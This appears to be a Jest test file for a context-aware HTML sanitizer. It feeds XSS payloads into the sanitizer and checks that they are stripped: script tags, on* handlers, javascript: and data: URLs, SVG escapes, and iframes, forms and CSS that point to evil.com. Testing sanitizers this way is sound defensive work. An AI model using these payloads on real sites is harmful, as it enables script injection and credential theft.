import { sanitize } from '../sanitizer';

// ---------------------------------------------------------------------------
// Helper
// ---------------------------------------------------------------------------
function out(input: string, context: Parameters<typeof sanitize>[1] = 'article') {
  return sanitize(input, context).output;
}

function wasModified(input: string, context: Parameters<typeof sanitize>[1] = 'article') {
  return sanitize(input, context).wasModified;
}

// ---------------------------------------------------------------------------
// 1. Basic script injection
// ---------------------------------------------------------------------------
describe('Script injection', () => {
  it('strips <script> tags', () => {
    expect(out('<script>alert("xss")</script>')).toBe('');
  });

  it('strips inline script with src', () => {
    expect(out('<script src="https://evil.com/xss.js"></script>')).toBe('');
  });

  it('strips script hidden inside allowed tag', () => {
    const result = out('<p>Hello<script>alert(1)</script>World</p>');
    expect(result).not.toContain('<script>');
    expect(result).toContain('Hello');
  });

  it('marks input as modified when script is removed', () => {
    expect(wasModified('<script>alert(1)</script>')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 2. Event handler injection (on* attributes)
// ---------------------------------------------------------------------------
describe('Event handler injection', () => {
  it('strips onclick', () => {
    expect(out('<a href="/" onclick="alert(1)">click</a>')).not.toContain('onclick');
  });

  it('strips onerror on img', () => {
    expect(out('<img src="x" onerror="alert(1)">')).not.toContain('onerror');
  });

  it('strips onload on body tag (body itself is also stripped)', () => {
    const result = out('<body onload="alert(1)"><p>text</p></body>');
    expect(result).not.toContain('onload');
  });

  it('strips onmouseover', () => {
    expect(out('<span onmouseover="alert(1)">hover me</span>')).not.toContain('onmouseover');
  });

  it('strips onfocus on input (input not in allowlist either)', () => {
    const result = out('<input onfocus="alert(1)">');
    expect(result).not.toContain('onfocus');
    expect(result).not.toContain('<input');
  });

  it('strips on* attributes added to allowed tags', () => {
    const result = out('<p onmouseenter="steal()" class="intro">Safe text</p>');
    expect(result).not.toContain('onmouseenter');
    expect(result).toContain('Safe text');
  });
});

// ---------------------------------------------------------------------------
// 3. javascript: URLs
// ---------------------------------------------------------------------------
describe('javascript: URL injection', () => {
  it('strips javascript: href', () => {
    const result = out('<a href="javascript:alert(1)">click</a>');
    expect(result).not.toContain('javascript:');
  });

  it('strips JAVASCRIPT: uppercase href', () => {
    const result = out('<a href="JAVASCRIPT:alert(1)">click</a>');
    expect(result).not.toContain('JAVASCRIPT:');
    expect(result).not.toContain('javascript:');
  });

  it('strips javascript: in img src', () => {
    const result = out('<img src="javascript:alert(1)">');
    expect(result).not.toContain('javascript:');
  });

  it('preserves https href', () => {
    const result = out('<a href="https://staffbase.com">link</a>');
    expect(result).toContain('href="https://staffbase.com"');
  });
});

// ---------------------------------------------------------------------------
// 4. data: URI injection
// ---------------------------------------------------------------------------
describe('data: URI injection', () => {
  it('strips data:text/html from href', () => {
    const payload = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
    expect(out(payload)).not.toContain('data:');
  });

  it('strips data:image/svg+xml (SVG XSS via data URI)', () => {
    const payload = '<img src="data:image/svg+xml,<svg onload=alert(1)>">';
    expect(out(payload)).not.toContain('data:');
  });
});

// ---------------------------------------------------------------------------
// 5. SVG / MathML namespace escapes
// ---------------------------------------------------------------------------
describe('SVG and MathML injection', () => {
  it('strips <svg> entirely', () => {
    const result = out('<svg><script>alert(1)</script></svg>');
    expect(result).not.toContain('<svg');
    expect(result).not.toContain('<script');
  });

  it('strips <math>', () => {
    expect(out('<math><mtext><script>alert(1)</script></mtext></math>')).not.toContain('<math');
  });

  it('strips SVG with onload event', () => {
    expect(out('<svg onload="alert(1)">')).not.toContain('<svg');
  });
});

// ---------------------------------------------------------------------------
// 6. Dangerous tags: iframe, object, form
// ---------------------------------------------------------------------------
describe('Dangerous HTML tags', () => {
  it('strips <iframe>', () => {
    expect(out('<iframe src="https://evil.com"></iframe>')).not.toContain('<iframe');
  });

  it('strips <object> (Flash/plugin execution)', () => {
    expect(out('<object data="https://evil.com/flash.swf"></object>')).not.toContain('<object');
  });

  it('strips <form> (CSRF / credential phishing)', () => {
    expect(out('<form action="https://evil.com/steal"><input name="pwd"></form>')).not.toContain('<form');
  });

  it('strips <embed>', () => {
    expect(out('<embed src="https://evil.com/plugin">')).not.toContain('<embed');
  });

  it('strips <link> (can load external CSS for data exfiltration)', () => {
    expect(out('<link rel="stylesheet" href="https://evil.com/steal.css">')).not.toContain('<link');
  });

  it('strips <meta> (redirect and refresh)', () => {
    expect(out('<meta http-equiv="refresh" content="0;url=https://evil.com">')).not.toContain('<meta');
  });

  it('strips <base> (changes all relative URLs in the page)', () => {
    expect(out('<base href="https://evil.com">')).not.toContain('<base');
  });
});

// ---------------------------------------------------------------------------
// 7. CSS injection via style attribute
// ---------------------------------------------------------------------------
describe('CSS injection', () => {
  it('strips style attribute in article context', () => {
    // style is not in the article allowlist; it is only in email
    const result = out('<p style="background:url(https://evil.com/track.gif)">text</p>');
    expect(result).not.toContain('style=');
  });

  it('strips <style> block entirely', () => {
    const result = out('<style>body{background:url(https://evil.com/x)}</style>');
    expect(result).not.toContain('<style');
  });
});

// ---------------------------------------------------------------------------
// 8. HTML entity / encoded bypass attempts
// ---------------------------------------------------------------------------
describe('Encoding bypass attempts', () => {
  it('handles HTML entity encoded script tag', () => {
    // These are already-encoded entities — the browser wouldn't re-execute them.
    // DOMPurify sees the decoded form after parsing.
    const result = out('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(result).not.toContain('<script>');
  });

  it('handles null-byte in tag name', () => {
    // A null byte in a tag name makes it an unrecognised tag — no browser or
    // parser treats <scr\0ipt> as <script>, so the text content is harmless.
    // The sanitizer correctly strips the unknown tag element; the inner text
    // "alert(1)" appears as inert plain text (no execution context).
    const result = out('<scr\x00ipt>alert(1)</scr\x00ipt>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('<scr');
  });
});

// ---------------------------------------------------------------------------
// 9. Context-specific behaviour
// ---------------------------------------------------------------------------
describe('Context: notification (plain text only)', () => {
  it('strips all HTML tags', () => {
    const result = sanitize('<b>Hello</b> <a href="/">link</a>', 'notification');
    expect(result.output).not.toContain('<b>');
    expect(result.output).not.toContain('<a');
    expect(result.output).toContain('Hello');
    expect(result.output).toContain('link');
  });

  it('strips script in notification context', () => {
    const result = sanitize('<script>alert(1)</script>Important update', 'notification');
    expect(result.output).not.toContain('<script');
    expect(result.output).toContain('Important update');
  });
});

describe('Context: chat (moderate allowlist)', () => {
  it('allows <b> and <i>', () => {
    const result = sanitize('<b>bold</b> <i>italic</i>', 'chat');
    expect(result.output).toContain('<b>bold</b>');
  });

  it('does NOT allow tables in chat', () => {
    const result = sanitize('<table><tr><td>cell</td></tr></table>', 'chat');
    expect(result.output).not.toContain('<table');
  });

  it('does NOT allow images in chat', () => {
    const result = sanitize('<img src="https://staffbase.com/logo.png" alt="logo">', 'chat');
    expect(result.output).not.toContain('<img');
  });
});

describe('Context: article (wide allowlist)', () => {
  it('allows tables', () => {
    const result = sanitize('<table><tr><td>cell</td></tr></table>', 'article');
    expect(result.output).toContain('<table>');
  });

  it('allows images with https src', () => {
    const result = sanitize('<img src="https://cdn.staffbase.com/img.png" alt="img">', 'article');
    expect(result.output).toContain('<img');
    expect(result.output).toContain('src="https://cdn.staffbase.com/img.png"');
  });

  it('allows headings h1–h3', () => {
    const html = '<h1>Title</h1><h2>Sub</h2><h3>Sub-sub</h3>';
    const result = sanitize(html, 'article');
    expect(result.output).toContain('<h1>');
    expect(result.output).toContain('<h2>');
    expect(result.output).toContain('<h3>');
  });
});

// ---------------------------------------------------------------------------
// 10. SanitizeResult shape
// ---------------------------------------------------------------------------
describe('SanitizeResult', () => {
  it('returns correct context in result', () => {
    expect(sanitize('<p>Hello</p>', 'chat').context).toBe('chat');
    expect(sanitize('<p>Hello</p>', 'article').context).toBe('article');
  });

  it('wasModified is false for already-clean input', () => {
    expect(sanitize('<p>Hello world</p>', 'article').wasModified).toBe(false);
  });

  it('wasModified is true when attack payload is cleaned', () => {
    expect(sanitize('<p onclick="x()">text</p>', 'article').wasModified).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 11. Tab-napping prevention
// ---------------------------------------------------------------------------
describe('Tab-napping prevention', () => {
  it('adds rel="noopener noreferrer" when target="_blank" is present', () => {
    const result = out('<a href="https://staffbase.com" target="_blank">link</a>');
    expect(result).toContain('rel="noopener noreferrer"');
  });
});
